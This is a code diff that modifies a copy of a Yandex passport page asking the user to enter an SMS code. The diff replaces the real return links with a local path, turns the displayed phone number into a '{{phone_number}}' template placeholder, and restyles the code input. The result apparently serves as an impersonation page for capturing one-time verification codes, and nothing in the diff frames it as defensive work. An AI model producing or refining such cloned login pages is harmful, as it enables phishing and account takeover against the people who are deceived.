@@ -61,10 +61,10 @@
                     <div class="passp-auth theme-default">
                         <div class="passp-page-overlay"></div>
 <div class="PagePopup"><a data-t="closer"
-                                                  href="/auth/add?retpath=https%3A%2F%2Fid.yandex.ru%2F%3Fncrnd%3D91902&amp;noreturn=1"
+                                                  href="/"
                                                   class="PreviousStepButton PreviousStepButton_type_closer"
                                                   aria-label="Назад"><span
-                                data-pane="/auth/add?retpath=https%3A%2F%2Fid.yandex.ru%2F%3Fncrnd%3D91902&amp;noreturn=1"
+                                data-pane="/"
                                 data-link=""></span></a>
                             <div class="Header">
                                 <div class="Header-yaLogoBlock"><a aria-label="Яндекс" href="https://ya.ru"
@@ -73,7 +73,7 @@
                             <div data-t="page:popup:challenges-call">
                                 <h1 data-t="title" class="passp-title">
                                     <div>Введите код из СМС, отправленный на номер <span class="passp-phone-template"
-                                                                                         dir="ltr">+380 98 *** **09</span>
+                                                                                         dir="ltr">{{phone_number}}</span>
                                     </div>
                                 </h1>
                                 <form method="post" class="PasspAuthForm" data-t="page:form:challenges-call">
@@ -85,7 +85,7 @@
                                                     data-t="field:label-phoneCode" for="passp-field-phoneCode">Введите
                                                 код</label></div>
                                             <div class="Field-inputWrapper"><span
-                                                    class="Textinput Textinput_view_rounded-corner Textinput_size_xxl"><input
+                                                    class="Textinput Textinput_focused Textinput_hovered Textinput_view_rounded-corner Textinput_size_xxl"><input
   data-t="field:input-phoneCode"
   dir="ltr"
   aria-invalid="false"
